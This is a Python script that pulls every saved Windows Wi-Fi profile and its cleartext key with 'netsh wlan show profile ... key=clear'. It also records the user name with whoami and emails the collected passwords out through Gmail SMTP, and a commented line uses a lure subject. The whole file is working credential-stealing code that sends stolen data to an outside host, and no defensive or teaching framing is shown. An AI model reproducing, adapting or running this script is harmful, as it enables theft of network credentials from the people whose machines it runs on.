from ntpath import join
import  subprocess
import smtplib
import os
from email.mime.text import MIMEText


def send_email(message, username):
    # your mail 
    sender = "yourmail@gmail.com"
    # your password = "your password"
    password = '********!'
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()

    try:
        server.login(sender, password)
        msg = MIMEText(message)
        msg["Subject"] = 'Wifi passwords from ' + username
        server.sendmail(sender, sender, msg.as_string())

        # server.sendmail(sender, sender, f"Subject: CLICK ME PLEASE!\n{message}")

        return "The message was sent successfully!"
    except Exception as _ex:
        return f"{_ex}\nCheck your login or password please!"


def extract_wifi_passwords():
    """Extracting Windows Wi-Fi passwords into .txt file"""
    
    profiles_data = subprocess.check_output('netsh wlan show profiles').decode('cp866').split('\n')
    username = subprocess.check_output('whoami').decode('cp866')
    profiles = [i.split(':')[1].strip() for i in profiles_data if 'Все профили пользователей' in i]
    wifi_info = ''
    for profile in profiles:
        profile_info = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear').decode('cp866').split('\n')
        try:
            password = [i.split(':')[1].strip() for i in profile_info if 'Содержимое ключа' in i][0]
        except IndexError:
            password = None

        wifi_info = wifi_info + f'Profile: {profile}\nPassword: {password}\n{"#" * 20}\n'
        
    send_email(wifi_info, username)



def main():
    extract_wifi_passwords()


if __name__ == '__main__':
    main()
